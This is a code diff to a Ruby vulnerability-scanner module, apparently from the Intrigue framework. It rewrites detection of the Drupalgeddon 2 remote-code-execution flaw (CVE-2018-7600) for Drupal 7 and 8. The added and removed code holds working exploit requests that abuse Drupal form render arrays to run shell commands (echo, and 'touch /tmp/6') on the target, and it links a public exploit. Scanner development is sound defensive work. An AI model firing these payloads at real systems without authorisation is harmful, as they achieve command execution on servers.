@@ -18,9 +18,10 @@ module Intrigue
           ],
           references: [
             { type: 'description', uri: 'https://nvd.nist.gov/vuln/detail/CVE-2018-7600' },
-            { type: 'description', uri: 'https://drupal.org/sa-core-2018-002'},
+            { type: 'description', uri: 'https://drupal.org/sa-core-2018-002' },
+            { type: 'exploit', uri: 'https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708'}
           ],
-          authors: ['jl-dos', 'rootxharsh', 'iamnoooob', 'S1r1u5_', 'cookiehanhoan', 'madrobot', 'maxim']
+          authors: ['_dreadlocked', 'g0tmi1k', 'maxim']
         }.merge!(instance_details)
       end
     end
@@ -39,144 +40,57 @@ module Intrigue
         drupal_8_paths = ['core/CHANGELOG.txt', 'core/includes/bootstrap.inc', 'core/includes/database.inc']
 
         responses = drupal_7_paths.map { |p| http_request(:get, "#{uri}/#{p}").code }
-        return 7 unless (responses & ['200', '403']).empty?
+        return 7 unless (responses & %w[200 403]).empty?
 
         responses = drupal_8_paths.map { |p| http_request(:get, "#{uri}/#{p}").code }
-        return 8 unless (responses & ['200', '403']).empty?
+        return 8 unless (responses & %w[200 403]).empty?
 
         _log_error 'Drupal Version does not appear to be supported; aborting.'
       end
 
-      # return truthy value to create an issue
+      def drupal_7_check(uri)
+        randomstr = SecureRandom.alphanumeric(10)
+        r = http_request(:post, "#{uri}/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo+#{randomstr}",
+                         nil, {}, 'form_id=user_pass&_triggering_element_name=name')
+
+        form_id = r.body_utf8.scan(/<input type="hidden" name="form_build_id" value="(form\-[\w|\-]+)"/).flatten.first
+        _log_error 'Unable to parse form_build_id from response; aborting task.' if form_id.nil?
+        return if form_id.nil?
+
+        r2 = http_request(:post, "#{uri}/?q=file/ajax/name/%23value/#{form_id}",
+                          nil, {}, "form_build_id=#{form_id}")
+        r2.body_utf8.include? randomstr
+      end
+
+      def drupal_8_check(uri)
+        randomstr = SecureRandom.alphanumeric(10)
+
+        post_body = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=echo #{randomstr}"
+        r = http_request(:post, "#{uri}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+                        nil, {}, post_body)
+        return true if r.body_utf8.include? randomstr
+
+        # first check didn't work; yolo second check (blind check)
+        _log 'First Drupal 8 check did not work; attempting blind check.'
+
+        post_body2 = 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=echo abc'
+        r2 = http_request(:post, "#{uri}/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+                         nil, {}, post_body2)
+
+        r2.body_utf8.include?('The website encountered an unexpected error. Please try again later.') && r2.code == '500'
+      end
+
       def check
-        # run a nuclei
         uri = _get_entity_name
         version = detect_drupal_version(uri)
         return if version.nil?
 
-        drupal_7_template = <<-HEREDOC
-        id: CVE-2018-7600
+        _log_good "Drupal #{version} detected; running respective check."
+        vuln = version == 8 ? drupal_8_check(uri) : drupal_7_check(uri)
+        
+        _log 'Target does not appear to be vulnerable.' unless vuln
 
-        info:
-          name: Drupal Drupalgeddon 2 RCE (Drupal 7)
-          author: maxim
-          severity: critical
-          reference: https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600
-          tags: cve,cve2018,drupal,rce
-        
-        requests:
-          - raw:
-              - |
-                POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo+-1ntr16u31337 HTTP/1.1
-                Host:  {{Hostname}}
-                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-                Referer:  {{Hostname}}/user/register
-                Content-Type: application/x-www-form-urlencoded
-                Connection: close
-        
-                form_id=user_pass&_triggering_element_name=name
-        
-              - |
-                POST /?q=file/ajax/name/%23value/{{form_build_id}} HTTP/1.1
-                Host:  {{Hostname}}
-                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-                Referer:  {{Hostname}}/user/register
-                Content-Type: application/x-www-form-urlencoded
-                Connection: close
-        
-                form_build_id={{form_build_id}}
-        
-            matchers-condition: and
-            matchers:
-              - type: status
-                status:
-                  - 200
-                  
-              - type: word
-                words:
-                  - '1ntr16u31337'
-                part: body
-            extractors:
-              - type: regex
-                name: form_build_id
-                part: body
-                group: 1
-                internal: true
-                regex:
-                  - '<input type="hidden" name="form_build_id" value="(form\-[\w|\-]+)"'
-        HEREDOC
-
-        drupal_8_template = <<-HEREDOC
-        id: CVE-2018-7600
-
-        info:
-          name: Drupal Drupalgeddon 2 RCE (Drupal 8)
-          author: pikpikcu, maxim
-          severity: critical
-          reference: https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600
-          tags: cve,cve2018,drupal,rce
-        
-        requests:
-          - raw:
-              - |
-                POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
-                Host:  {{Hostname}}
-                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-                Accept: application/json
-                Referer:  {{Hostname}}/user/register
-                X-Requested-With: XMLHttpRequest
-                Content-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663
-                Connection: close
-        
-                -----------------------------99533888113153068481322586663
-                Content-Disposition: form-data; name="mail[#post_render][]"
-        
-                passthru
-                -----------------------------99533888113153068481322586663
-                Content-Disposition: form-data; name="mail[#type]"
-        
-                markup
-                -----------------------------99533888113153068481322586663
-                Content-Disposition: form-data; name="mail[#markup]"
-        
-                echo 1ntr16u31337
-                -----------------------------99533888113153068481322586663
-                Content-Disposition: form-data; name="form_id"
-        
-                user_register_form
-                -----------------------------99533888113153068481322586663
-                Content-Disposition: form-data; name="_drupal_ajax"
-        
-              - |
-                POST /user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
-                Host:  {{Hostname}}
-                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-                Referer:  {{Hostname}}/user/register
-                Content-Type: application/x-www-form-urlencoded
-                Connection: close
-        
-                form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=passthru&timezone[a][#lazy_builder][][]=touch+/tmp/6
-        
-            matchers-condition: and
-            matchers:
-              - type: word
-                words:
-                  - "1ntr16u31337"
-                  - "The website encountered an unexpected error. Please try again later"
-                part: body
-                condition: or
-        
-              - type: status
-                status:
-                  - 200
-                  - 500
-                condition: or
-        
-        HEREDOC
-
-        _log "Target appears to be running Drupal Version #{version}!"
-        template = version == 8 ? drupal_8_template : drupal_7_template
-        run_nuclei_template_from_string(uri, template)
+        vuln
 
       end
     end
